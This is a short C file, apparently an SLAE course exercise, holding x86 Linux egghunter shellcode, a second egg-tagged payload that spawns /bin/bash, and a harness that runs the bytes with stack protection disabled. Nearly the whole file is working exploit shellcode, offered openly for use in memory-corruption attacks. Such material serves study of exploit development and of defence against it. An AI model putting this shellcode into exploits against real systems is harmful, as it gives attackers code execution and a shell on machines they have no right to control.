/*

Architecture	: x86
OS		: Linux
Author		: wetw0rk
ID		: SLAE-958
Egg Hunter Size	: 37 bytes
Description	: An example of egghunter shellcode. The following
		  consists of our EGG to be located, and then go's
		  to /bin/sh.

Test Using:
	gcc -fno-stack-protector -z execstack tshell.c
*/

#include <stdio.h>
#include <string.h>

/* eggy */
#define EGG "\x90\x50\x90\x50"

/* our egg hunter */
unsigned char eggh[]= \
"\x31\xc9\x58\x99\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21"
"\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf"
"\x75\xe9\xaf\x75\xe6\xff\xe7";

/* this is were we put the bigger payload */
unsigned char code[]= \
EGG
EGG
"\xeb\x18\x5b\x31\xc0\x88\x43\x09\x89\x5b\x0a\x89\x43\x0e\xb0"
"\x0b\x8d\x1b\x8d\x4b\x0a\x8d\x53\x0e\xcd\x80\xe8\xe3\xff\xff"
"\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x44\x45\x41\x44"
"\x42\x45\x45\x46";

int main()
{
	printf("EGG Hunter Length            : %d\n", strlen(eggh));
	printf("EGG is at                    : %p\n", code);
	printf("Shellcode Length + EGG bytes : %d\n", strlen(code));
	int (*ret)() = (int(*)())eggh; /* EGG points to our shellcode */
	ret();
}

